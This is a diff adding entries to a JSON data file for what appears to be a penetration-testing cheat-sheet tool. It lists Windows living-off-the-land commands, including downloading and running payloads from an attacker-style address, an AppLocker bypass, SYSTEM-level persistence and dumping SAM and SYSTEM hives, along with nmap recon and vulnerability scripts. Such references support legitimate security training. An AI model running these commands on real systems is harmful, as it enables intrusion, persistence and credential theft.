@@ -121,5 +121,42 @@
     { "name": "adcs",            "protocol": "ldap",  "description": "Enumerate AD Certificate Services (CAs/templates)" },
     { "name": "pso",             "protocol": "ldap",  "description": "Enumerate Password Settings Objects (fine-grained policy)" },
     { "name": "mssql_priv",      "protocol": "mssql", "description": "Check/escalate MSSQL privileges (impersonation, sysadmin)" }
+  ],
+  "lolbas": [
+    { "binary": "certutil.exe",  "function": "Download",   "command": "certutil -urlcache -split -f http://10.10.14.x/f.exe C:\\Windows\\Temp\\f.exe" },
+    { "binary": "bitsadmin.exe", "function": "Download",   "command": "bitsadmin /transfer j http://10.10.14.x/f.exe C:\\Windows\\Temp\\f.exe" },
+    { "binary": "powershell.exe","function": "Download",   "command": "powershell -c \"iwr http://10.10.14.x/f.exe -OutFile C:\\Windows\\Temp\\f.exe\"" },
+    { "binary": "certutil.exe",  "function": "Encode",     "command": "certutil -encode in.bin out.b64  /  -decode out.b64 in.bin" },
+    { "binary": "mshta.exe",     "function": "Execute",    "command": "mshta http://10.10.14.x/payload.hta" },
+    { "binary": "regsvr32.exe",  "function": "Execute",    "command": "regsvr32 /s /n /u /i:http://10.10.14.x/f.sct scrobj.dll" },
+    { "binary": "rundll32.exe",  "function": "Execute",    "command": "rundll32 shell32.dll,Control_RunDLL C:\\path\\evil.dll" },
+    { "binary": "msbuild.exe",   "function": "Execute",    "command": "msbuild.exe evil.csproj  (inline task, AppLocker bypass)" },
+    { "binary": "wmic.exe",      "function": "Execute",    "command": "wmic process call create \"cmd /c whoami > C:\\Windows\\Temp\\o\"" },
+    { "binary": "sc.exe",        "function": "Persistence","command": "sc create svc binPath= \"C:\\path\\f.exe\" start= auto && sc start svc" },
+    { "binary": "schtasks.exe",  "function": "Persistence","command": "schtasks /create /sc minute /mo 1 /tn t /tr C:\\path\\f.exe /ru SYSTEM" },
+    { "binary": "reg.exe",       "function": "CredAccess", "command": "reg save HKLM\\SAM sam & reg save HKLM\\SYSTEM system" },
+    { "binary": "findstr.exe",   "function": "Recon",      "command": "findstr /si password *.txt *.ini *.config *.xml" },
+    { "binary": "icacls.exe",    "function": "Recon",      "command": "icacls \"C:\\path\\service.exe\"  (check for writable service binaries)" },
+    { "binary": "net.exe",       "function": "Recon",      "command": "net user /domain & net group \"Domain Admins\" /domain" }
+  ],
+  "nse": [
+    { "script": "default (-sC)",         "category": "default", "description": "Safe default scripts; run with -sV on every initial scan" },
+    { "script": "banner",                "category": "default", "description": "Grab service banners on open ports" },
+    { "script": "vuln",                  "category": "vuln",    "description": "Run all vuln-detection scripts: nmap --script vuln -p<ports>" },
+    { "script": "ftp-anon",              "category": "auth",    "description": "Detect anonymous FTP login" },
+    { "script": "ssh-auth-methods",      "category": "auth",    "description": "Enumerate accepted SSH auth methods for a user" },
+    { "script": "http-enum",             "category": "discovery","description": "Enumerate common web dirs/apps" },
+    { "script": "http-title",            "category": "discovery","description": "Grab page titles to fingerprint web apps" },
+    { "script": "http-shellshock",       "category": "vuln",    "description": "Test CGI endpoints for Shellshock (CVE-2014-6271)" },
+    { "script": "smb-os-discovery",      "category": "discovery","description": "OS, hostname, domain via SMB" },
+    { "script": "smb-enum-shares",       "category": "discovery","description": "List SMB shares and access levels" },
+    { "script": "smb-enum-users",        "category": "discovery","description": "Enumerate domain/local users via SMB" },
+    { "script": "smb-vuln-ms17-010",     "category": "vuln",    "description": "Detect EternalBlue (MS17-010)" },
+    { "script": "dns-zone-transfer",     "category": "discovery","description": "Attempt AXFR zone transfer" },
+    { "script": "krb5-enum-users",       "category": "auth",    "description": "Enumerate valid domain users via Kerberos" },
+    { "script": "rdp-ntlm-info",         "category": "discovery","description": "Pull domain/host info from RDP NTLM" },
+    { "script": "ssl-enum-ciphers",      "category": "discovery","description": "Enumerate TLS versions/ciphers (weak crypto)" },
+    { "script": "ms-sql-info",           "category": "discovery","description": "MSSQL instance/version info" },
+    { "script": "mysql-empty-password",  "category": "auth",    "description": "Check MySQL root for empty password" }
   ]
 }
